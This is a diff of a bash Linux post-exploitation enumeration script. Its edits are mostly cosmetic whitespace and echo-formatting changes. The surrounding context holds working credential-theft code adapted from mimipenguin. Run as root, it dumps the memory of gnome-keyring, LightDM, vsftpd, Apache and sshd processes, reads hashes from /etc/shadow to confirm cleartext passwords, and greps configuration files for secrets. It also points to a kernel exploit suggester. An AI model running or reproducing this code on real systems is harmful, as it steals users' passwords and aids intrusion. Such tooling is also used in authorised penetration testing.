@@ -461,20 +461,17 @@ fi
 echo -e "\n${BLUE}╔═════{ Configuration files that might contain sensitive information:${XX}"
     grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
 echo -e "\n${BLUE}╔═════{ Cleartext Credentials in Memory:${XX}"
-echo -e "\n${BLUE}╔═════{ Supported by mimipenguin:${XX}"
-echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mimipenguin ${XX}"
+echo -e "${BLUE}    ══{ Supported by mimipenguin:${XX}"
+echo -e "${BLUE}    ══{ Download link: https://github.com/huntergregal/mimipenguin ${XX}"
     root () { [ "$(id -u)" -eq 0 ]; }
     if root;
         then
             #Store results to cleanup later
             export RESULTS=""
-
             # check if a command exists in $PATH
             command_exists () {
-
             command -v "${1}" >/dev/null 2>&1
             }
-
             # check for required executables in $PATH
             if ! command_exists strings; then
                 echo "Error: command 'strings' not found in ${PATH}"
@@ -484,7 +481,6 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                 echo "Error: command 'grep' not found in ${PATH}"
                 exit 1
             fi
-
             # Check for any of the currently tested versions of Python
             if command_exists python2; then
                 pycmd=python2
@@ -500,10 +496,8 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                 echo "Error: No supported version of 'python' found in ${PATH}"
                 exit 1
             fi
-
             # $1 = PID, $2 = output_file, $3 = operating system
             function dump_pid () {
-
                 system=$3
                 pid=$1
                 output_file=$2
@@ -522,17 +516,12 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                         skip="$memrange_start" count="$memrange_size" > /dev/null 2>&1
                 done <<< "$mem_maps"
             }
-
-
-
             # $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
             function parse_pass () {
-
                 #If hash not in dump get shadow hashes
                 if [[ ! "$2" ]]; then
                         SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
                 fi
-
                 #Determine password potential for each word
                 while read -r line; do
                     #If hash in dump, prepare crypt line
@@ -585,8 +574,6 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                     fi
                 done <<< "$1"
             } # end parse_pass
-
-
             #Support Kali
             if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
                 SOURCE="[SYSTEM - GNOME]"
@@ -609,14 +596,11 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                     done <<< "$PID"
                 fi
             fi
-
             #Support gnome-keyring
             if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
-
                     SOURCE="[SYSTEM - GNOME]"
                     #get /usr/bin/gnome-keyring-daemon process
                     PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk -F ' ' '{ print $1 }')"
-
                 #if exists aka someone logged into gnome then extract...
                 if [[ $PID ]];then
                     while read -r pid; do
@@ -633,12 +617,10 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                     done <<< "$PID"
                 fi
             fi
-
             #Support LightDM
             if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; then
                 SOURCE="[SYSTEM - LIGHTDM]"
                 PID="$(ps -eo pid,command | grep lightdm | sed -rn '/session\-child/p' | awk -F ' ' '{ print $1 }')"
-
                 #if exists aka someone logged into lightdm then extract...
                 if [[ $PID ]]; then
                     while read -r pid; do
@@ -654,7 +636,6 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                     done <<< "$PID"
                 fi
             fi
-
             #Support VSFTPd - Active Users
             if [[ -e "/etc/vsftpd.conf" ]]; then
                     SOURCE="[SYSTEM - VSFTPD]"
@@ -671,12 +652,10 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                         DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                         parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
                     done <<< "$PID"
-
                     #cleanup
                     rm -rf /tmp/vsftpd*
                 fi
             fi
-
             #Support Apache2 - HTTP BASIC AUTH
             if [[ -e "/etc/apache2/apache2.conf" ]]; then
                     SOURCE="[HTTP BASIC - APACHE2]"
@@ -703,7 +682,6 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
                     rm -rf /tmp/apache*
                 fi
             fi
-
             #Support sshd - Search active connections for Sudo passwords
             if [[ -e "/etc/ssh/sshd_config" ]]; then
                 SOURCE="[SYSTEM - SSH]"
@@ -729,7 +707,8 @@ echo -e "\n${BLUE}    ══{ Download link: https://github.com/huntergregal/mim
             printf "%b" "$RESULTS" | sort -u
             unset RESULTS
     else
-        echo -e "${RED}        Requires Root${XX}"
+        echo -e "\n"
+        echo -e "${RED}    ══{ Requires Root${XX}"
     fi
 echo -e "\n"
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
@@ -739,7 +718,7 @@ echo -e "\n"
 echo -e "\n${BLUE}╔═════{ System Name:${XX}"
     uname -a 2>/dev/null
 echo -e "\n${BLUE}╔═════{ Kernal Exploit supported by linux-exploit-suggester:${XX}"
-echo -e "\n${BLUE}    ══{ Download link: https://github.com/mzet-/linux-exploit-suggester.git ${XX}"
+echo -e "${BLUE}    ══{ Download link: https://github.com/mzet-/linux-exploit-suggester.git ${XX}"
     UNAME_A=""
     KERNEL=""
     OS=""
